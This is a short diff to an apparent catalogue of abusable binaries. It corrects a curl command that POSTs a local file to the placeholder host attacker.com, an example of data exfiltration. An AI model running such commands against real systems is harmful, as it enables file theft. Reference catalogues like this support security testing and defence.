@@ -5,7 +5,7 @@ functions:
       code: |
         URL=http://attacker.com/
         LFILE=file_to_send
-        curl -X POST -d @$file_to_send $URL
+        curl -X POST -d "@$LFILE" $URL
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
